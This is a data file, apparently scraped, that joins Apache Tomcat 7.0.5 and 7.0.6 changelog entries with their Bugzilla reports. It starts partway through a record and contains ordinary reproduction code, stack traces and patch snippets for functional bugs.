< Date: Sun, 19 Dec 2010 12:18:02 GMT
< 
{ [data not shown]
100  2750    0  2750    0     0   455k      0 --:--:-- --:--:-- --:--:--  671k* Connection #0 to host 127.0.0.1 left intact

* Closing connection #0
       8      87    2750
msmac:apache-tomcat-6.0.29 sperl$ tail -1 logs/localhost_access_log.2010-12-19.txt 
127.0.0.1 - - [19/Dec/2010:13:18:02 +0100] ""GET / HTTP/1.1"" 200 7777
msmac:apache-tomcat-6.0.29 sperl$"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50496
Catalina|Tomcat 7.0.6 (markt)|fix|50550|When a new directory is created (e.g. via WebDAV) ensure that a subsequent request for that directory does not result in a 404 response. (markt)|PropFind 404 error after MkCol succes|"A propfind call on a resource returns a 404 error when executed after a mkcol for the same resource. The mkcol should be preceeded with a propfind to trigger the issue. 

Steps to reproduce - See the following access log;
  127.0.0.1 - - [06/Jan/2011:14:09:19 +0100] ""PROPFIND /webdav/output/f469e3d6-e536-4072-82da-d989acaf57a2/ HTTP/1.1"" 404 1084
  127.0.0.1 - - [06/Jan/2011:14:09:19 +0100] ""MKCOL /webdav/output/f469e3d6-e536-4072-82da-d989acaf57a2/ HTTP/1.1"" 201 -
  127.0.0.1 - - [06/Jan/2011:14:09:19 +0100] ""PROPFIND /webdav/output/f469e3d6-e536-4072-82da-d989acaf57a2/ HTTP/1.1"" 404 1084

When the first request would be omitted, the third request would have been succesful, as the following access log shows;
  127.0.0.1 - - [06/Jan/2011:14:10:39 +0100] ""MKCOL /webdav/output/81a97360-ea49-44d3-b764-d8c7e60e885e/ HTTP/1.1"" 201 -
  127.0.0.1 - - [06/Jan/2011:14:10:39 +0100] ""PROPFIND /webdav/output/81a97360-ea49-44d3-b764-d8c7e60e885e/ HTTP/1.1"" 207 628

Note: After a few seconds, the response to propfind for that resource is OK again. This suggests this has to do with caching.

Note2: This situation sounds similar to call 21288 (FIXED - 'DirContext caching problem with Dreamweaver 6 when recursively creating directories').

Reproducable using a jackrabbit client;

____
    HttpClient client = new HttpClient();

    String newDir = ""http://localhost:8080/webdav/output/"" + UUID.randomUUID() + ""/"";

    // Comment out this request to make second propfind succesful
    HttpMethod propFindMethod1 = new PropFindMethod(newDir);
    client.executeMethod(propFindMethod1);
    propFindMethod1.releaseConnection();

    HttpMethod mkcolMethod = new MkColMethod(newDir);
    client.executeMethod(mkcolMethod);
    mkcolMethod.releaseConnection();

    HttpMethod propFindMethod = new PropFindMethod(newDir);
    client.executeMethod(propFindMethod);
    propFindMethod.releaseConnection();
____"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50550
Catalina|Tomcat 7.0.6 (markt)|fix|50554|Code clean up. (markt)|Bad use of getClass() could potentially lead to concurrency bugs in future|"The method org.apache.naming.java.javaURLContextFactory.getInitialContext(Hashtable<?,?>) has a synchronized block on getClass(). Using getClass() as lock is a bug pattern because if some class subclasses javaURLContextFactory and getInitialContext gets called on an instance of such a subclass, getClass() will return a different Class object for that instance. Locking different objects for different classes is usually not the expected behavior. Therefore, I suggest to remove this bug pattern by simply replacing getClass() by javaURLContextFactory.class.

See https://www.securecoding.cert.org/confluence/display/java/LCK02-J.+Do+not+synchronize+on+the+class+object+returned+by+getClass%28%29 for more information about this bug pattern.

Keshmesh (https://github.com/reprogrammer/keshmesh/) is an Eclipse plugin that analyzes the source code of Java programs to detect concurrency bug patterns such the one I reported."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50554
Catalina|Tomcat 7.0.6 (markt)|add|50556|Improve JreMemoryLeakPreventionListener to prevent a potential class loader leak caused by a thread spawned when the class com.sun.jndi.ldap.LdapPoolManager is initialized and the system property com.sun.jndi.ldap.connect.pool.timeout is set to a value greater than 0. (slaurent)|improve JreMemoryLeakPreventionListener against leak caused by LdapPoolManager|"When class com.sun.jndi.ldap.LdapPoolManager is initialized, if if the system property com.sun.jndi.ldap.connect.pool.timeout is set to a value greater than 0, a PoolCleaner thread is spawned, without fixing a specific context class loader.
If the initialization of the class is triggered by a web application, its class loader will be used by the PoolCleaner thread. If that web app is stopped, its class loader will leak.

We can improve JreMemoryLeakPreventionListener to prevent that leak."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50556
Coyote|Tomcat 7.0.6 (markt)|fix|47319|"Return the client's IP address rather than null for calls to getRemoteHost() when the APR connector is used with enableLookups=""true"" but the IP address is not resolveable. (markt)"|With APR, getRemoteHost() returns NULL for unknown clients|"Hello,

I posted this info to the tomcat users mailing list and am following Mark Thomas' advice to open a bug report:

My setup is a RedHat 5 server (32 bit) running Tomcat 6.0.20 with Tomcat Native 1.1.16 libraries and Sun JDK 1.6.0_14.  I've built and installed Tomcat Native as described in http://tomcat.apache.org/native-doc/

The server.xml file has been modified to add enableLookups=""true"" to the HTTP Connector entry:

    <Connector port=""8080"" protocol=""HTTP/1.1""
               connectionTimeout=""20000""
               enableLookups=""true""
               redirectPort=""8443"" />

Now, when the client exists in the DNS, reverse lookups via HttpServletRequest.getRemoteHost() work fine whether or not I'm using APR.

The problem is, when attempting a reverse lookup for a client that is not found in the naming service, the behaviour of getRemoteHost() depends on whether or not APR is being used.  Specifically, without APR, the method returns the dotted-string form of the IP address (consistent with the doc http://java.sun.com/webservices/docs/1.6/api/javax/servlet/ServletRequest.html#getRemoteHost() ).  However, when APR is enabled, the method returns NULL.

I can reproduce the problem using a simple test servlet:

# cat GetAddress.java
import java.io.*;
import java.util.*;
import javax.servlet.*;
import javax.servlet.http.*;

public class GetAddress extends HttpServlet {
  public void doGet(HttpServletRequest request,HttpServletResponse response)
    throws IOException, ServletException{
    response.setContentType(""text/html"");
    PrintWriter out = response.getWriter();   
    out.println(""<b><font color='red'>Hostname of request : </font></b>""
        +request.getRemoteHost()+""<p>"");
    out.println(""<b><font color='blue'>IP Address of request : </font></b>""
        +request.getRemoteAddr());
  }
}

If LD_LIBRARY_PATH is set to $CATALINA_HOME/lib, catalina.out confirms APR is enabled:

05-Jun-2009 11:09:01 org.apache.catalina.core.AprLifecycleListener init
INFO: Loaded APR based Apache Tomcat Native library 1.1.16.
05-Jun-2009 11:09:01 org.apache.catalina.core.AprLifecycleListener init
INFO: APR capabilities: IPv6 [true], sendfile [true], accept filters [false], random [true].
05-Jun-2009 11:09:02 org.apache.coyote.http11.Http11AprProtocol init

From my client unknown to the DNS, the web page shows ""Hostname of request: null ... IP Address of request: <client IP address>""

Now, after simply unsetting LD_LIBRARY_PATH and restarting Tomcat (catalina.out confirms APR is not used), a request from the same client correctly shows ""Hostname of request: <client IP address>... IP Address of request: <client IP address>""


This behaviour with APR is causing problems for a third-party application that relies on identifying the client IP/host for authentication - as the code does not expect NULL from getRemoteHost() it denies access to the client (coming from another company via LAN-to-LAN VPN).

Any ideas on how to debug this further?  Nothing is logged to catalina.out when the error occurs.  I also had a quick look in the APR source but couldn't find any reference to getRemoteHost or enableLookups so I'm not sure where this side effect is coming from.

Thanks in advance for any feedback,

Best regards


- Paul."|https://bz.apache.org/bugzilla/show_bug.cgi?id=47319
Coyote|Tomcat 7.0.6 (markt)|add|50108|Add get/set methods for Connector property minSpareThreads. Patch provided by Eiji Takahashi. (markt)|Add missing setter/getter to AbstractXXXProtocol|"Created attachment 26182 [details]
patch for AbstractXXXProtocol

Add missing following methods to AbstractHttp11Protocol and AbstractAjpProtocol.
- setMinSpareThreads
- getMinSpareThreads

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50108
Coyote|Tomcat 7.0.6 (markt)|fix|50360|Provide an option to control when the socket associated with a connector is bound. By default, the socket is bound on Connector.init() and released on Connector.destroy() as per the current behaviour but this can be changed so that the socket is bound on Connector.start() and released on Connector.stop(). This fix also includes further Lifecycle refactoring for Connectors and associated components. (markt)|Server socket still bound after Embedded.stop is invoked|"After stopping an Embedded tomcat the server socket is still bound (in state LISTEN).

This test case fails:


import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.ServerSocket;
import java.net.UnknownHostException;

import org.apache.catalina.Context;
import org.apache.catalina.Engine;
import org.apache.catalina.Host;
import org.apache.catalina.LifecycleException;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.session.StandardManager;
import org.apache.catalina.startup.Embedded;
import org.testng.Assert;
import org.testng.annotations.Test;


@SuppressWarnings( ""deprecation"" )
public class TestEmbeddedStop {

    @Test
    public void testShutdown() throws Exception {
        final int port = 18888;
        final Embedded tomcat1 = createCatalina( port );
        tomcat1.start();
        tomcat1.stop();
        try {
            new ServerSocket( port );
        } catch ( final IOException e ) {
            Assert.fail( ""Could not open new server socket on port "" + port, e );
        }
    }

    public static Embedded createCatalina( final int port ) throws MalformedURLException,
            UnknownHostException, LifecycleException {

        final Embedded catalina = new Embedded() {

            @Override
            // Workaround for #50358 - Embedded.stopInternal sets state to STARTING, should be STOPPING
            protected void stopInternal() throws LifecycleException {
                super.stopInternal();
                setState(LifecycleState.STOPPING);
            }

        };

        final Engine engine = catalina.createEngine();

        engine.setName( ""engine-"" + port );
        engine.setDefaultHost( ""localhost"" );

        final String docBase = System.getProperty( ""java.io.tmpdir"" );
        final Host host = catalina.createHost( ""localhost"", docBase );
        engine.addChild( host );

        final Context context = catalina.createContext( """", ""webapp"" );
        host.addChild( context );
        new File( docBase, ""webapp"" ).mkdirs();

        context.setManager( new StandardManager() );

        catalina.addEngine( engine );
        engine.setService( catalina ); // needed to prevent NPE in ApplicationContext.populateSessionTrackingModes

        final Connector connector = catalina.createConnector( ""localhost"", port, false );
        catalina.addConnector( connector );

        return catalina;
    }

}


When  org.apache.catalina.connector.Connector.stopInternal is changed and sets the state to LifecycleState.MUST_DESTROY at the end this works as expected: the server socket is closed and free for further use."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50360
Coyote|Tomcat 7.0.6 (markt)|fix||Remove a huge memory leak in the NIO connector introduced by the fix for 49884. (markt)|NullPointerException in org.apache.catalina.core.AsyncContextImpl.doInternalComplete|"Hi, I'm running Tomcat trunk (revision 992708, 2010-09-03) and I'm hitting an async servlet (see attached) with Apache Bench, and every once in a while I see a NullPointerException in org.apache.catalina.core.AsyncContextImpl.doInternalComplete:

Sep 4, 2010 8:09:39 PM org.apache.catalina.core.AsyncContextImpl doInternalDispatch
FINE: TIMING OUT!
Sep 4, 2010 8:09:40 PM org.apache.catalina.core.AsyncContextImpl doInternalDispatch
FINE: TIMING OUT!
Sep 4, 2010 8:09:40 PM org.apache.catalina.core.AsyncContextImpl doInternalComplete
SEVERE: 
Throwable occurred: java.lang.NullPointerException
	at org.apache.catalina.core.AsyncContextImpl.doInternalComplete(AsyncContextImpl.java:384)
	at org.apache.catalina.core.AsyncContextImpl.doInternalDispatch(AsyncContextImpl.java:327)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:238)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:201)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:163)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:108)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:557)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:301)
	at org.apache.coyote.http11.Http11Processor.asyncDispatch(Http11Processor.java:333)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:258)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:257)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:898)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:920)
	at java.lang.Thread.run(Thread.java:736)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=49884
Coyote|Tomcat 7.0.6 (markt)|fix|50467|Protected against NPE triggered by a race condition that causes the NIO poller to fail, preventing the processing of further requests. (markt)|Occasional NIO connector lockups on high load|"We've been running Tomcat 6.0.29 on FC8 2.6.21 with tens of thousands of long polling threads which usually work fine. Every few days though we will experience a sudden lockup of the NIO connector and it has to be restarted. These have been seen to be accompanied by the following stack trace:

Exception in thread ""http-8082-ClientPoller-0"" java.lang.NullPointerException
	at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1620)
	at java.lang.Thread.run(Thread.java:662)

Looking at the source it seems the issue is likely to be a race condition where access() is called on a null attachment, probably while it's in the process of being cancelled:

                    while (iterator != null && iterator.hasNext()) {
                        SelectionKey sk = (SelectionKey) iterator.next();
                        KeyAttachment attachment = (KeyAttachment)sk.attachment();
/*NPE*/                 attachment.access();
                        iterator.remove();
                        processKey(sk, attachment);
                    }//while"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50467
Jasper|Tomcat 7.0.6 (markt)|add|13731|Make variables in _jspService() method final where possible. (markt)|Final request, response, session and other variables.|"Provide a capability to declare request, response, session and other variables 
in jspService function as final. As tunable feature, just like others, in 
tomcat`s web.xml file.

Why need this feature? To use request, response, session variables in anonymous 
implementations of classes. For example - declaration of iterator through 
elements, which includes some other JSP file (statically). And usage of this 
iterator in other JSP file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=13731
Jasper|Tomcat 7.0.6 (markt)|fix|50408|Fix NoSuchMethodException when using scoped variables with EL method invocation. (markt)|Scoped EL variable in methodexpression is treated as Object|"Consider following example:

<dl>
  <c:forEach items=""${pageContext.response.headerNames}"" var=""name"">
    <c:forEach items=""${pageContext.response.getHeaders(name)}"" var=""value"">
      <dt>${name}</dt><dd>${value}</dd>
    </c:forEach>
  </c:forEach>
</dl>

The ${name} is a String. The ${name.class.name} also proves that. The getHeaders(name) call however results in:

org.apache.jasper.el.JspELException: /test.jsp(23,12) '${pageContext.response.getHeaders(name)}' java.lang.NoSuchMethodException: org.apache.catalina.connector.ResponseFacade.getHeaders(java.lang.Object)

Another example which also results in NoSuchMethodException which suggests that an Object is been passed as argument:

<c:set var=""name"" value=""test"" />
${pageContext.response.getHeader(name)}

This works all fine on Glassfish v3."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50408
Jasper|Tomcat 7.0.6 (markt)|fix|50460|Avoid a memory leak caused by using a cached exception instance in JspDocumentParser and ProxyDirContext. (kkolinko)|First access to a jspx page causes classloader leak in JspDocumentParser|"Running latest 6.0.x,

To reproduce:
1. Stop Tomcat
2. Deploy the examples webapp
3. Create /webapps/examples/foo.jsp file containing the following text:
<jsp:include page=""/jsp/jsp2/jspx/basic.jspx""/>

4. Make sure that the work folder of Tomcat is empty.
5. Start Tomcat
6. Go to http://localhost:8080/examples/foo.jsp
7. Go to the Manager web application and stop the examples webapp.
8. Press the ""Find leaks"" button there.
ACTUAL RESULT:
It is reported that ""/examples"" causes a leak.
EXPECTED RESULT:
No leaks.

This issue is apparently caused by an instance of org.apache.jasper.compiler.JspDocumentParser$EnableDTDValidationException
that is being kept in a static final field.

More discussion of such leaks can be found in thread [1] on dev@.

[1] http://tomcat.markmail.org/thread/v4xmg5v5t6oa4mrs
http://marc.info/?l=tomcat-dev&m=129211856426188&w=2

Additional comments:
1) This issue affects the first request that loads the JspDocumentParser class. Subsequent requests do not cause the issue. Thus only a single webapp is affected.
2) The issue does not happen when there is no webapp code in the call stack. I.e., it does not happen if the JSPX page was requested directly.
That is why the reproduction recipe uses <jsp:include/>.

Possible solutions:
1) Preload the JspDocumentParser class when Tomcat starts.
2) Do not cache the Exception. Create a new instance each time.
3) Override the fillInStackTrace() method, like it was done in AbstractDOMParser$Abort in Apache Xerces [2]. I do not know, whether that helps or not.

[2] http://svn.apache.org/viewvc/xerces/java/trunk/src/org/apache/xerces/parsers/AbstractDOMParser.java?annotate=782187#l162"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50460
Jasper|Tomcat 7.0.6 (markt)|fix|50500|Use correct coercions (as per the EL spec) for arithmetic operations involving string values containing '.', 'e' or 'E'. Based on a patch by Brian Weisleder. (markt)|EL evaluation of floating-point String value vs BigInteger loses precision|"According to the EL spec ch.1.7.1,
the A+B,A-B,A*B expressions when A is a ""String containing ., e, or E"" and B is a BigInteger have to be evaluated as follows:

""coerce both A and B to BigDecimal and apply operator""

The actual implementation though, instead of coercing A as String -> BigDecimal, does two coercions:  String -> Double -> BigDecimal, which produces a different result.

To reproduce, run the following JSP page:
<%
  pageContext.setAttribute(""a"", ""1.1"");
  pageContext.setAttribute(""b"", new java.math.BigInteger(""1000000000000000000000""));
  // ""c"" is used to explicitly coerce arguments to BigDecimal
  pageContext.setAttribute(""c"", new java.math.BigDecimal(""0""));
%>${a + b}<br>
${(a+c) + (b+c)}<br>
${a - b}<br>
${(a+c) - (b+c)}<br>
${a * b}<br>
${(a+c) * (b+c)}

Actual result:
1000000000000000000001.100000000000000088817841970012523233890533447265625
1000000000000000000001.1
-999999999999999999998.899999999999999911182158029987476766109466552734375
-999999999999999999998.9
1100000000000000088817.841970012523233890533447265625000000000000000000000
1100000000000000000000.0 

Expected result:
1000000000000000000001.1
1000000000000000000001.1
-999999999999999999998.9
-999999999999999999998.9
1100000000000000000000.0 
1100000000000000000000.0 

I think it is a minor issue, though.
This is reproducible in the current tc6.0.x as well.

Maybe o.a.el.lang.ELArithmetic#add(Object, Object) should delegate to BIGDECIMAL instead of DOUBLE with these types of arguments."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50500
Cluster|Tomcat 7.0.6 (markt)|add|50185|Add additional trace level logging to Tribes to assist with fault diagnosis. Based on a patch by Ariel. (markt)|[tribes] Logging improvement|"Created attachment 26230 [details]
proposed patch

Hi,

Analyzing some apache tribes logs, I needed a few log items more.
It would be great if you can include them in trunk.

Attaching patch.


Regards,
Ariel"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50185
Cluster|Tomcat 7.0.6 (markt)|fix||Don't try and obtain session data from the cluster if the current node is the only node in the cluster. Log requesting session data as INFO rather than WARNING. (markt)|||
Cluster|Tomcat 7.0.6 (markt)|fix|50503|When web application has a version, Engine level Clustering works correctly. (kfujino)|Engine level Clustering does not work correctly if the web application has a version.|"In Engine level clustering, the name of the cluster manager is  ""HostName#contextName"". 
SimpleTcpCluster#getManagerName(String, Manager) is as follows. 
====
public String getManagerName(String name, Manager manager) {
    String clusterName = name ;
    if ( clusterName == null ) clusterName = manager.getContainer().getName();
    if(getContainer() instanceof Engine) {
        Container context = manager.getContainer() ;
        if(context != null && context instanceof Context) {
            Container host = ((Context)context).getParent();
            if(host != null && host instanceof Host && clusterName!=null && !(clusterName.indexOf(""#"")>=0))
                clusterName = host.getName() +""#"" + clusterName ;
        }
    }
    return clusterName;
}
====

In this method, clusterName.indexOf(""#"") >= 0 is checked. 

Because the context name becomes contextName##version if the web application has a version, 
the name of the cluster manager doesn't become a format of ""HostName#contextName"". 
As a result, Engine level Clustering doesn't work correctly. 

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50503
Cluster|Tomcat 7.0.6 (markt)|fix|50547|Add time stamp for CHANGE_SESSION_ID message and SESSION_EXPIRED message. (kfujino)|The CHANGE_SESSION_ID message that received during cluster session synchronization is dropped.|"Neither CHANGE_SESSION_ID message nor SESSION_EXPIRED message set timestamp. 
If these messages are received during cluster sessions synchronization in DeltaManager startup, 
because the timestamp is not set, they are dropped. 

I made a patch that add timestamp for CHANGE_SESSION_ID and SESSION_EXPIRED message.

Best Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50547
Web applications|Tomcat 7.0.6 (markt)|fix|21157|Ensure cookies are written before the response is committed in the Cookie example. Patch provided by Stefan Radzom. (markt)|CookieExample is setting cookie after writing data|"A servlet can not set the headers and cookies after writing data to the 
servlet's output stream. Once the servlet writes data, headers are committed. 
However CookieExample writes some data first before doing addCookie on the 
response. 

The reason why this code works at all even with the above bug is: The 
CookieExample is only writing a small amount of data before doing 
response.addCookie. That data is still held in buffer and not yet sent over 
the wire. Hence the headers are not yet committed. So it is pure luck that 
this example works. 

You can easily expose the bug by writing say 20K characters in this example 
before response.addCookie is called. You will see that the cookies that are 
adding to response are not actually sent back to client. 

Fix is simple. Move up the response.addCookie() before response.getWriter()"|https://bz.apache.org/bugzilla/show_bug.cgi?id=21157
Web applications|Tomcat 7.0.6 (markt)|add|50294|Add more information to documentation regarding format of configuration files. Patch provided by Luke Meyer. (markt)|Mention obvious things about config format|"Created attachment 26311 [details]
diff against http://svn.apache.org/repos/asf/tomcat/trunk/webapps/docs

It might be obvious to those who work on Tomcat, but sometimes things need to be spelled out for others. I suggest mentioning at the top of the config section that configs are schemaless XML and case-sensitive. Patches created against the docs webapps in 5.5, 6.0, and trunk that are basically like this:

--- config/index.xml    (revision 1036202)
+++ config/index.xml    (working copy)

-<p>The Tomcat configuration files support Apache Ant style variable
-substitution. A system property with the name <code>propname</code> may be
+<p>Tomcat configuration files are formatted as schemaless XML; elements and
+attributes are case-sensitive. Apache Ant-style variable substitution
+is supported; a system property with the name <code>propname</code> may be
 used in a configuration file using the syntax <code>${propname}</code>. All"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50294
Web applications|Tomcat 7.0.6 (markt)|fix||Correctly validate provided context path so sessions for the ROOT web application can be viewed through the HTML Manager. (markt)|||
Web applications|Tomcat 7.0.6 (markt)|update||Improve documentation of database connection factory. (rjung)|||
Web applications|Tomcat 7.0.6 (markt)|fix|50488|Update classpath required when using jsvc and add a note regarding server VMs. (markt)|classpath for jsvc in web page|"in the page http://tomcat.apache.org/tomcat-7.0-doc/setup.html in section ""Unix daemon""

the argument ""-cp ./bin/bootstrap.jar"" must be replaced with ""-cp ./bin/bootstrap.jar:./bin/tomcat-juli.jar"" 

Using only ""-cp ./bin/bootstrap.jar"" tomcat can't start due to a class not found exception ""java.lang.NoClassDefFoundError: org/apache/juli/logging/LogFactory"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=50488
Web applications|Tomcat 7.0.6 (markt)|fix||Further filtering of Manager display output. (kkolinko)|||
Other|Tomcat 7.0.6 (markt)|fix||Don't configure Windows installer to use PID file since it is not removed when the service stops which prevents the service from starting. (markt)|||
Other|Tomcat 7.0.6 (markt)|fix|14416|Make TagLibraryInfo.getTag() more robust at handling nulls. (markt)|blank tag name in TLD cause NullPointerException|"In case a blank tag name exists in TLD like follows,

  <tag>
    <name/>
    <tag-class>foo.BarTag</tag-class>
  </tag>

Jasper jspc reports

% $JASPER_HOME/bin/jasper.bat jspc

error:null

To found this reason, I took few hours.
I want Jasper jspc to report more details!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=14416
Other|Tomcat 7.0.6 (markt)|fix|50552|Avoid NPE that hides error message when using Ant tasks. (schultz)|Ant Tasks give a null pointer exception when an error occurs, masking true error|"Created attachment 26463 [details]
Fix to abstract catalina task class to set up redirector correctly

Using the Ant List Task with outputproperty set causes a null pointer exception in the event of any error. For example, if tomcat is not running or the url given is incorrect. Since the bug is in a base class, this probably affects all the ant tasks.

The bug is due to the fact that the code to clean up the redirector is called in the finally block, but the equivalent code to set it up is not. This problem is also present in Tomcat 6.

The attached patch fixes the problem. With the patch in place, using the list task when tomcat is down gives ""Connection refused"" instead."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50552
Other|Tomcat 7.0.6 (markt)|add||Provide two alternative locations for the libraries downloaded from the ASF web site at build time. Use the main distribution site as default and the archive one as fallback. (kkolinko)|||
General|Tomcat 7.0.5 (markt)|update||Update to Apache Commons Daemon 1.0.4. (mturk)|||
Catalina|Tomcat 7.0.5 (markt)|fix|3839|Provide a mechanism to gracefully handle the case where users book-mark the form login page or otherwise misuse the FORM authentication process. Based on a suggestion by Mark Morris. (markt)|Problem bookmarking login page|"I have a web application that uses form based authentication.

if I go to a protected page for example:
http://myhost/myapp/index.html
then I get the authentication form:
http://myhost/myapp/login.jsp
I fill it up, and submit and I get authenticated and the page
http://myhost/myapp/index.html
is properly shown.


However, if instead of trying to go to a protected resource, I try to go 
directly to the login.jsp page, and that is pretty common since some people 
like to bookmark the login page, then this is what happens:

I go to the login page:
http://myhost/myapp/login.jsp

the login page gets displayed properly. but if I fill it up and submit, the 
browser gets redirected to this address:

http://myhost/myapp/null
and the following error is shown on the browser:
HTTP Status 404 - /null
The requested resource (/null) is not available. 

The behavior that I would like to see is that the default page for the web 
application be shown.

I think this is what is happening:
if I go to a protected resource the url gets saved somewhere in the session
then after I submit the login information, the server redirects the browers to 
the saved location.

But if I go directly to the login page, then there is no url that failed the 
security constraints, and nothing is saved. After I submit, it tries to go to 
whatever is saved (null in this case) and since there is no page named null an 
error is shown. What is needed is an extra check somewhere that says: if the 
saved location is null, then go to the default webapp page."|https://bz.apache.org/bugzilla/show_bug.cgi?id=3839
Catalina|Tomcat 7.0.5 (markt)|fix|49180|Add option to disable log rotation in juli FileHandler. Patch provided by Pid (pidster at apache). (funkman)|Add option to disable log rotation in FileHandler.|"Small enhancement to FileHandler.java which allow susers to disable log rotation by setting the .rotation attribute to ""false""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49180
Catalina|Tomcat 7.0.5 (markt)|fix|49991|Ensure servlet request listeners are fired for the login and error pages during FORM authentication. (markt)|Tomcat 7 JAAS problem with CDI|"Tomcat is suffering from the same bug fixed in Glassfish:
https://glassfish.dev.java.net/issues/show_bug.cgi?id=12642

When the container redirects to a login page, CDI (Weld) tell that there is no active contexts for requestscope."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49991
Catalina|Tomcat 7.0.5 (markt)|fix|50107|When removing a Host via JMX, do not attempt to destroy the host's pipeline twice. Patch provided by Eiji Takahashi. (markt)|StandardPipeline is destroyed two times.|"Created attachment 26181 [details]
patch for MBeanFactory.java

When I call MBeanFactory#removeHost operation via JMX(jconsle), I get the following message.

INFO: The destroy() method was called on component [Pipeline[StandardHost[localhost]]] after destroy() had already been called. The second call will be ignored.

StandardPipeline is destroyed two times.
At first, pipeline is destroyed at ContainerBase.java L.1096:
<<ContainerBase.java destroyInternal() L.1094-1097>>
   1094         // Stop the Valves in our pipeline (including the basic), if any
   1095         if (pipeline instanceof Lifecycle) {
   1096             ((Lifecycle) pipeline).destroy();
   1097         }

<<ContainerBase.java destroyInternal() L.1104-1107>>
   1104         // Required if the child is destroyed directly.
   1105         if (parent != null) {
   1106             parent.removeChild(this);
   1107         }
When above-mentioned ""parent"" is StandardEngine, the parent.removeChild() calls the  LifecycleBase#child.destroy(), and child.destroy() calls ContainerBase#destroyInternal().
At this time ContainerBase is StandardHost.
<<ContainerBase.java removeChild() L.960-964>>
    960         // Set child's parent to null to prevent a loop
    961         child.setParent(null);
    962         try {
    963             child.destroy();
    964         } catch (LifecycleException e) {

As a result, pipeline is destroyed again(, and get the above-mentioned info message).

In Tomcat 6.0, child.destroy() is not called from ContainerBase#removeChild().
But, as seen above, the removeChild() that is contained in Tomcat7.0 calls the child.destroy().
IMHO, it might not be better to call the child.destroy() from removeHost().

I made the patch that removed host.destroy() from removeHost(). 

Best regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50107
Catalina|Tomcat 7.0.5 (markt)|fix|50138|Fix threading issues in org.apache.catalina.security.SecurityUtil. (markt)|Lack of synchronization in org.apache.catalina.security.SecurityUtil|"Symptom: all processor threads spin madly in:
==============
""tomcat-processor-20"" daemon prio=10 tid=0x09210800 nid=0x51fb runnable [0x61b76000]
   java.lang.Thread.State: RUNNABLE
	at java.util.HashMap.getEntry(HashMap.java:347)
	at java.util.HashMap.containsKey(HashMap.java:335)
	at org.apache.catalina.security.SecurityUtil.doAsPrivilege(SecurityUtil.java:227)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:230)
	at org.apache.catalina.core.ApplicationFilterChain.access$000(ApplicationFilterChain.java:56)
	at org.apache.catalina.core.ApplicationFilterChain$1.run(ApplicationFilterChain.java:189)
	at java.security.AccessController.doPrivileged(Native Method)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:185)
...
==============

Cause: org.apache.catalina.security.SecurityUtil.objectCache is a HashMap, but access to it is not synchronized. The javadoc for HashMap says:
=============
Note that this implementation is not synchronized. If multiple threads access a hash map concurrently, and at least one of the threads modifies the map structurally, it must be synchronized externally.
=============

Proposed solution: change objectCache to ConcurrentHashMap;"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50138
Catalina|Tomcat 7.0.5 (markt)|fix|50157|Ensure MapperListener is only added to a container object once. (markt)|a lot of MapperListener is registered as ContainerListener of StandardContext|"Created attachment 26213 [details]
patch for MapperListener.java

The same five MapperListener is registered as ContainerListener of StandardContext. 

At first when I add StandardHost by using ""Engine addChild operation"" via JMX, same MapperListener is registered as ContainerListener of StandardHost.

StandardEngine.addChild()
->StandardEngine.addChildInternal()
  ->StandardEngine.fireContainerEvent()
    ->MapperListener.containerEvent() line: 133 <-- here
      ...
    ->MapperListener.containerEvent() line: 135
      ->MapperListener.registerHost() line: 276 <-- here

Therefore, StandardHost has the same two MapperListener as ContainerListener. 
---

Then, starting StandardHost by using ""Host start operation"", the same five MapperListener is registered as ContainerListener of StandardContext. 

(1)LifecycleState of StandardHost is changed to STARTING.
StandardHost(LifecycleBase).start() line:140
->StandardHost(ContainerBase).startInternal()
  ...
  ->StandardHost(ContainerBase).fireContainerEvent <-- fireContainerEvent fire two times
    ...
    ->MapperListener.containerEvent() line:133 <-- here
    ...
    ->MapperListener.containerEvent() line:137
      ->MapperListener.registerContext() line:339 <-- here

(2)LifecycleState of StandardHost is changed to STARTED.
StandardHost(LifecycleBase).start() line:156
...
->MapperListener.registerHost() line:279
  ->MapperListener.registerContext() line:339 <-- here
---
I think that the memory is wasted a little because of the above issue.

